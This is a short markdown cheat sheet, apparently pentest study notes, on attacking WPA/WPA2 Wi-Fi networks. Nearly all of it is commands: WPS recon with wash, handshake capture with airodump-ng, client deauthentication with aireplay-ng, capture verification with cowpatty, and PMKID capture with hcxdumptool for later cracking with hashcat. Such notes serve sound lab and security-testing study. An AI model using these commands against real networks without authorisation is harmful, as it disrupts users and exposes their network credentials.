#wifi #wpa #wpa2 #handshake #pmkid

# Attacking WPA/WPA2

Handshake capture + PMKID. Related: [basics](basics.md) · [password-cracking](password-cracking.md) · [wps](wps.md)

## Recon
```bash
sudo wash -j -i wlan0mon
```
Scan for WPS-enabled networks (verbose).

```bash
grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt
```
Look up an AP vendor by MAC OUI.

## Capture 4-Way Handshake
```bash
sudo airodump-ng wlan0mon -c 1 -w WPA
```
Capture on the target channel to a file.

```bash
sudo aireplay-ng -0 5 -a <AP_MAC> -c <client_MAC> wlan0mon
```
Deauth a client to force a handshake.

```bash
cowpatty -c -r WPA-01.cap
```
Verify the capture contains a valid handshake. See [password-cracking](password-cracking.md).

## PMKID Attack (clientless)
```bash
sudo hcxdumptool -i wlan0mon --enable_status=3
```
Scan for PMKID-vulnerable networks.

```bash
hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=<target_BSSID> --filtermode=2 -o HTBPMKID.pcap
```
Capture the target's PMKID (then crack with hashcat -m 22000). See [password-cracking](password-cracking.md).
